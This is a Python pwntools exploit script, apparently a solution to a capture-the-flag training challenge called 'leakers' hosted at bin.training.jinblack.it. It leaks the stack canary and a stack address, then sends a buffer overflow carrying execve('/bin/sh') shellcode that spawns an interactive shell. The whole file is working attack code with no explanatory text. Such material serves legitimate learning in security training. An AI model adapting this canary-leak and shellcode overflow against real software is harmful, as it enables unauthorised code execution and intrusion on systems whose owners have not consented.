import sys
from pwn import *
from pwn import p64, u64

def send(p, payload):
    p.send(payload)
    

def send_payload(p, payload):
    p.send(payload)
    time.sleep(0.1)
    # p.interactive()
    p.recvuntil(b"> ")
    p.recv(len(payload))

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2010)
else:
    p = process("./leakers")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x401255
    # b *0x401223
    # b *0x401262
    c
    """)

p.recvuntil(b"Welcome to Leakers!\n\n")
send(p, b"A" * 10)
time.sleep(0.1) # avoid read of additional data

send_payload(p, b"A" * 105)
canary = u64(b"\x00" + p.recv(7))

print("canary", hex(canary))

offset = 104 + 8 * 4
send_payload(p, b"A" * offset)
leak = p.recv(6)
print("leak", leak)
address = u64(leak.ljust(8, b"\x00"))
address -= 0x158

print("address", hex(address))

shellcode = asm("""
mov rax, 0x3b
mov rdi, %s
mov rsi, 0
mov rdx, 0
syscall
"""%(address + 1), arch='amd64')

payload  = b" /bin/sh\0"
payload += shellcode
payload  = payload.ljust(104, b"\x90") + p64(canary) + b"A" * 8 +  p64(address + 9)
send(p, payload)
time.sleep(0.1)

send(p, b"\n")
time.sleep(0.1)

p.recvuntil(b"Bye!\n")

p.sendline(b"ls")

p.interactive()